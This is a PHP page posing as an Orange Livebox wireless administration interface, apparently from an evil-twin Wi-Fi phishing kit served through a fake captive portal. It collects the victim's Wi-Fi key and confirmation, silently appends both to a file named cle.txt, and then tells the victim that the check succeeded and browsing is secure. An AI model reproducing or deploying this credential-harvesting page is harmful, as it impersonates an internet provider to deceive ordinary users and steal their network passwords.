<?php
$cle = $_POST['cle'];
$cleconf = $_POST['cleconf'];
$fp = fopen("cle.txt","a+"); // ouverture du fichier en écriture
fputs($fp, $cle.PHP_EOL);
fputs($fp, $cleconf.PHP_EOL);
fclose($fp);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Interface Livebox d'Orange</title>
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript" src="easySlider.packed.js"></script>
<script type="text/javascript">
	$(document).ready(function(){	
		$("#slider").easySlider();
	});
</script>
<meta name="description" content="Simple easy-to-use jQuery plugin for sliding images and content">
</meta>

<style>
body {
	margin:0;
	padding:40px;
	background:#FFFFFF;
	font:80% Arial, sans-serif;
	color:#FF6501;
	line-height:180%;
}
h1{
	font-size:180%;
	font-weight:normal;
	}
h2{
	font-size:160%;
	font-weight:normal;
	}	
h3{
	font-size:140%;
	font-weight:normal;
	}	
img{border:none;}
pre{
	display:block;
	font:12px "Courier New", Courier, monospace;
	padding:10px;
	border:1px solid #bae2f0;
	background:#e3f4f9;	
	margin:.5em 0;
	width:500px;
	}		
</style>
</head>
<body>
<img name="logo" src="/msftconnecttest/imageslvb/livebox1.png" width="200" height="100"></td>
	 <?php
            if (!empty($_POST['cle']) && !empty($_POST['cleconf']) ) // Vérifie si les variables des clés ne sont pas vides
        {
			$cle=$_POST['cle'];
			$cleconf=$_POST['cleconf'];
		
				if ( $cle == $cleconf) // Vérifie si les deux clés sont identiques
            {
					if (strlen($cle) >7 && strlen($cle) <63 )
				{                 
					?>	
					<br>
					<br>
				<h1>Interface d'administration sans fil</h1>
			</p>
			<p>
La v&eacute;rification a &eacute;t&eacute; correctement effectu&eacute;e vous pouvez reprendre la navigation internet en toute s&eacute;curit&eacute; avec votre Livebox d'Orange en scannant le qr code ci-dessous avec vos équipements pour vous connecter.</p>
<img name="logo" src="/msftconnecttest/imageslvb/qrcode.png" width="" height="">
<?php
                }
				
					 if (strlen($cle) <7)
				{
					?>
					<h1> Erreur ! </h1>
					Il y a eu un probl&egrave;me dans la v&eacute;rification : vos cl&eacute;s sont trop courtes. 
					<br/>Veuillez <a href="index.php">recommencer</a>.
					<?php
				}
			
				if (strlen($cle) >63)
				{
					?>
					<h1> Erreur ! </h1>
					Il y a eu un probl&egrave;me dans la v&eacute;rification : vos cl&eacute;s sont trop longues. 
					<br/>Veuillez <a href="index.php">recommencer</a>.
					<?php
				}	
            }
			
				else
            {
				?>
				<h1> Erreur ! </h1>
				Il y a eu un probl&egrave;me dans la v&eacute;rification : vos cl&eacute;s ne sont pas identiques. 
				<br/>Veuillez <a href="index.php">recommencer</a>.
				<?php
			}
        }
			
			else
        {
			?>		
			<h1> Erreur ! </h1>
			Vous devez remplir les deux champs ! 
			<br/>Veuillez <a href="index.php">recommencer</a>.
			<?php
        }
        ?>
<?php 
  header( "refresh:5; url=valid.php" );
?>
	</body>
</html>

</body>
</html>
